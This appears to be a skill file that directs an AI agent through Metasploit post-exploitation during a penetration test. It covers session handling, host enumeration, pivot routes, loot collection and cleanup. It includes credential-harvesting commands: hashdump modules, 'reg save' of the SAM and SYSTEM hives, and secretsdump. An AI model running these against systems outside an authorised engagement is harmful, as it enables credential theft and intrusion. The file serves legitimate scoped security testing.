---
name: msf-post
description: >-
  Post-exploitation workflow using Metasploit MCP. Use when interacting with
  active sessions, running post modules, harvesting credentials, collecting
  loot, or cleaning up sessions.
---

# Metasploit Post-Exploitation

## When to Use
- Active session obtained via `msf-exploit-chain`
- Need to enumerate compromised host
- Credential harvesting or privilege escalation
- Loot collection and evidence export

## Prerequisites
- Active session (verify with `msf_list_active_sessions`)
- Engagement ROE permits post-exploitation activities
- Evidence directory ready: `evidence/msf/`
- Load domain skill by platform/context (see skill routing below)

## Tool Inventory

**Read-only:** `msf_list_active_sessions`, `msf_list_listeners`, `msf_credential_info`, `msf_loot_info`, `msf_note_info`, `msf_route_list`

**Action (engagement_id required):** `msf_send_session_command`, `msf_run_post_module`, `msf_session_upgrade`, `msf_session_run_script`, `msf_wait_for_session`, `msf_terminate_session`, `msf_stop_job`, `msf_cleanup_jobs`

**Meterpreter session tools:**
- `msf_session_sysinfo` - Get OS, arch, hostname from Meterpreter session
- `msf_session_getuid` - Get current user identity from Meterpreter session
- `msf_session_ps` - List running processes in Meterpreter session
- `msf_session_download` - Download file from target to evidence/msf/
- `msf_session_upload` - Upload file from evidence/msf/ to target

**Route / pivot tools:**
- `msf_route_list` - List active routes for pivoting
- `msf_route_add` - Add route through a Meterpreter session
- `msf_route_delete` - Remove an active route
- `msf_autoroute` - Auto-add routes via post/multi/manage/autoroute

**Database write tools:**
- `msf_db_add_note` - Add notes/annotations to database
- `msf_report_host` - Manually report a host to the database
- `msf_credential_add` - Store discovered credentials in the database

## Skill routing by context

| Context | Skill |
|---------|-------|
| Windows privesc | `windows-pentest` |
| Linux privesc | `linux-pentest` |
| macOS privesc | `macos-pentest` |
| Active Directory | `internal-ad-pentest` |
| Lateral movement | `internal-ad-pentest`, `pivoting-pentest` |
| Persistence | `persistence-pentest` |
| Cloud from foothold | `cloud-pentest` |
| Container escape | `container-devops-pentest` |
| EDR/OPSEC | `red-team-evasion` |
| Service-specific | Load port skill via `pentest-knowledge-base` |

Read the relevant skill checklist before running post modules.

## Workflow

### Step 1: List sessions

**MSF MCP (preferred):**
```text
msf_list_active_sessions()
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'sessions -l; exit'"
```

Note session ID, type (shell vs meterpreter), target IP, and platform.

**Session ID resolution:** NEVER hardcode session_id=1. Always resolve from `msf_list_active_sessions()` output. Use the session matching your target IP or the most recently opened session.

### Step 2: Upgrade shell if needed

**MSF MCP (preferred):**
```text
msf_session_upgrade(
  engagement_id="<id>",
  session_id={session_id}
)
msf_wait_for_session(
  engagement_id="<id>",
  timeout=30
)
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'sessions -u 1; sessions -l; exit'"
```

### Step 3: Basic enumeration

**MSF MCP (preferred):**
```text
msf_send_session_command(
  engagement_id="<id>",
  session_id={session_id},
  command="sysinfo"
)
msf_send_session_command(
  engagement_id="<id>",
  session_id={session_id},
  command="getuid"
)
```

**CLI fallback:**
```bash
# Meterpreter: sysinfo, getuid via msfconsole
# Shell session: whoami, hostname, ipconfig / ifconfig on target directly
wsl -e bash -lc "msfconsole -q -x 'sessions -i 1 -c sysinfo; exit'"
```

### Step 4: Run post modules

#### User enumeration

**MSF MCP (preferred):**
```text
msf_run_post_module(
  engagement_id="<id>",
  module_name="windows/gather/enum_logged_on_users",
  session_id={session_id}
)
```

**CLI fallback:**
```bash
query user /domain
wmic computersystem get username
wsl -e bash -lc "msfconsole -q -x 'use post/windows/gather/enum_logged_on_users; set SESSION 1; run; exit'"
```

#### Credential harvesting

**MSF MCP (preferred):**
```text
msf_run_post_module(
  engagement_id="<id>",
  module_name="windows/gather/hashdump",
  session_id={session_id}
)
```

**CLI fallback:**
```bash
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL
wsl -e bash -lc "msfconsole -q -x 'use post/windows/gather/hashdump; set SESSION 1; run; exit'"
```

#### Network info

**MSF MCP (preferred):**
```text
msf_run_post_module(
  engagement_id="<id>",
  module_name="windows/gather/arp_scanner",
  session_id={session_id},
  options={"RHOSTS": "10.10.0.0/24"}
)
```

**CLI fallback:**
```bash
arp -a
ipconfig /all
wsl -e bash -lc "msfconsole -q -x 'use post/windows/gather/arp_scanner; set SESSION 1; set RHOSTS 10.10.0.0/24; run; exit'"
```

### Step 5: Check loot, credentials, and notes

**MSF MCP (preferred):**
```text
msf_loot_info(workspace="engagement-<id>")
msf_credential_info(workspace="engagement-<id>")
msf_note_info(workspace="engagement-<id>")
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'loot; creds; notes; exit'"
ls evidence/msf/
```

### Step 6: Document evidence

Save session output and post-module results to `evidence/msf/post-{target}-{date}.txt`.

### Step 7: Clean up

**MSF MCP (preferred):**
```text
msf_terminate_session(
  engagement_id="<id>",
  session_id={session_id}
)
msf_stop_job(
  engagement_id="<id>",
  job_id={job_id}
)
msf_cleanup_jobs(
  engagement_id="<id>"
)
msf_list_active_sessions()
msf_list_listeners()
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'sessions -k 1; jobs -k; jobs; sessions -l; exit'"
```

## Common Post Modules by Platform

### Windows
| Module | Purpose |
|--------|---------|
| `windows/gather/hashdump` | SAM hash dump |
| `windows/gather/enum_logged_on_users` | Logged-in users |
| `windows/gather/enum_shares` | Network shares |
| `windows/manage/enable_rdp` | Enable RDP (use cautiously) |

### Linux
| Module | Purpose |
|--------|---------|
| `linux/gather/hashdump` | /etc/shadow hashes |
| `linux/gather/enum_network` | Network config |
| `linux/gather/enum_system` | System info |

## Safety Rules
- Only run post modules on sessions within scope
- Never enable persistent backdoors without explicit approval
- Document every post-exploitation action
- Terminate sessions and stop jobs when evidence collection is complete

## Related skills

- `msf-exploit-chain` - exploit workflow that produces sessions
- `msf-harness` - tool reference and engagement setup
- `windows-pentest` - Windows post-exploitation and privesc
- `linux-pentest` - Linux post-exploitation and privesc
- `internal-ad-pentest` - AD credential and lateral movement
- `persistence-pentest` - persistence mechanisms (when ROE allows)
- `pivoting-pentest` - routing and tunneling through sessions
